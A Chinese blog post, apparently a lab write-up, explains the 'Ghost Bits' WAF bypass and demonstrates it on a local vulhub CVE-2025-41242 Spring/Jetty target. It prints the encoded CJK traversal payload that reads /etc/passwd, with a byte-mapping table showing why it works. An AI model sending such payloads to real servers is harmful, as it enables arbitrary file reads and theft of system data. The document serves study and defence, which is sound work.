---
title: Ghost Bits 实验
date: 2026-08-16 14:30:00
categories:
  - [技术, 安全]
tags: [Ghost Bits, WAF, Java]
---

## 漏洞分析：Ghost Bits WAF 绕过原理

### 1. Ghost Bits 漏洞原理

Ghost Bits（幽灵位）是一种利用 **Java 字符截断特性**的 WAF 绕过技术。

核心原理在于：**Java 在处理 Unicode 字符时，某些方法会静默丢弃高 8 位，只保留低 8 位。**

举个例子，这些方法：

```
String.getBytes()          DataOutputStream.writeBytes()
```

本质上做的操作是：

```
截断结果 = unicodeChar & 0xFF
```

这意味着，**只要构造一个 Unicode 字符，让它的低 8 位等于目标 ASCII 值，就能在服务端"伪装"成那个 ASCII 字符。**

我们正是利用这一点，把 WAF 能识别的敏感字符串（`../../`、`union select` 等）编码成**绕过规则的中文字符**，从而达到绕过检测的目的。

---

## 环境准备

### 1. 下载漏洞环境

以 **CVE-2025-41242** 为例：

```
https://github.com/vulhub/vulhub/tree/master/spring/CVE-2025-41242
```

提前准备好 docker，把容器拉进靶机，配合配套脚本解题即可。

> 💡 补充：如果环境拉取被拦截，请科学上网。

### 2. 启动靶机

```bash
docker compose up -d             # 复用已有容器
curl -s http://127.0.0.1:8080/   # 没问题的话输出：<h1>Hello World</h1>
```

可以看到环境已经准备好了。

![启动靶机](/img/posts/ghost-bits/01-start.webp)

---

## 靶场实战

靶场地址：`http://127.0.0.1:8080`，用 **Yakit** 抓包。

### 1. 先测试正常方法的目录遍历

抓包拿到的请求：

```http
GET / HTTP/1.1
Host: localhost:8080
Sec-Fetch-Site: none
Sec-Fetch-Dest: document
Sec-Fetch-User: ?1
Sec-Fetch-Mode: navigate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip, deflate, br, zstd
sec-ch-ua: "Not)A;Brand";v="8", "Chromium";v="138"
sec-ch-ua-platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
sec-ch-ua-mobile: ?0
```

先尝试最简单的目录遍历：

```http
GET /../../../../../../../etc/passwd HTTP/1.1
```

发包后返回 **400 Bad Request**。

![常规遍历被拒 400](/img/posts/ghost-bits/02-400.webp)

再试试 Unicode 编码的形式：

```http
GET /.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/etc/passwd HTTP/1.1
```

发包后**同样返回 400**。

### 2. 使用 Yakit 的编码插件

既然前面提到 Unicode 编码，先试试能不能利用 Ghost Bits。

**选中字符串，右键 → 右键插件 → Ghost Bits 编码。**

![Yakit 的 Ghost Bits 编码插件](/img/posts/ghost-bits/03-plugin.webp)

得到：

```
键严遵稰丰耲乥            (.%u002e  ——>  键严遵稰丰耲乥)
```

重新构建 payload ——— **注意要把 `passwd` 改掉一个字符**（需要修改一个字符才能触发 `StringUtils.uriDecode` 的解码）：

```jsx
passwd  ———>  pass%77d
```

最终 payload：

```http
GET /键严遵稰丰耲乥/键严遵稰丰耲乥/键严遵稰丰耲乥/键严遵稰丰耲乥/键严遵稰丰耲乥/键严遵稰丰耲乥/键严遵稰丰耲乥/etc/pass%77d HTTP/1.1
```

直接发包，可以看到返回 `root:x:0:0:` 等特征，**确认漏洞存在**。

![绕过成功，读到 /etc/passwd](/img/posts/ghost-bits/04-bypass.webp)

---

## 补充

**① 目标文件名里至少要有一个字符是 `%xx`**

例如 `passwd` → `pass%77d`。否则 **Spring 路径匹配会提前短路**，压根不会调用有问题的解码器。

**② 最好要多层 `键严遵稰丰耲乥/`**

每层解码成 `.%u002e/`。Spring 的 `isInvalidPath` 在根目录"退无可退"时会提前返回合法 —— **层数太少可能逃不出去**。

**③ 小肥 🐟 提示：`StringUtils.uriDecode()` 的行为**

它遇到非 `%xy` 字符时会调用 `ByteArrayOutputStream.write(int)`，**只保留 16 位 char 的低 8 位**：

| #   | 字符 | 码点   | 二进制              | 低 8 位 | 得到 |
| --- | ---- | ------ | ------------------- | ------- | ---- |
| 1   | 键   | U+952E | 1001 0101 0010 1110 | 0x2E    | `.`  |
| 2   | 严   | U+4E25 | 0100 1110 0010 0101 | 0x25    | `%`  |
| 3   | 遵   | U+9075 | 1001 0000 0111 0101 | 0x75    | `u`  |
| 4   | 稰   | U+7A30 | 0111 1010 0011 0000 | 0x30    | `0`  |
| 5   | 丰   | U+4E30 | 0100 1110 0011 0000 | 0x30    | `0`  |
| 6   | 耲   | U+8032 | 1000 0000 0011 0010 | 0x32    | `2`  |
| 7   | 乥   | U+4E65 | 0100 1110 0110 0101 | 0x65    | `e`  |

于是 `键严遵稰丰耲乥` 被静默"炼"成 `.%u002e`：

**Spring 侧看不到 `..`** ✅ **`URLDecoder` 又不认 `%uXXXX`** ✅ **检查全过** ✅

但路径交给 **Jetty 的 `PathResource#resolve`** 时，`URIUtil.encodePathSafeEncoding`（jetty-util ≥ 12.0）会把 `%u002e` 当 Unicode 解码成 `.` —— `/。%u002e/` 在文件系统层就是 `/../` → **任意文件读取**。
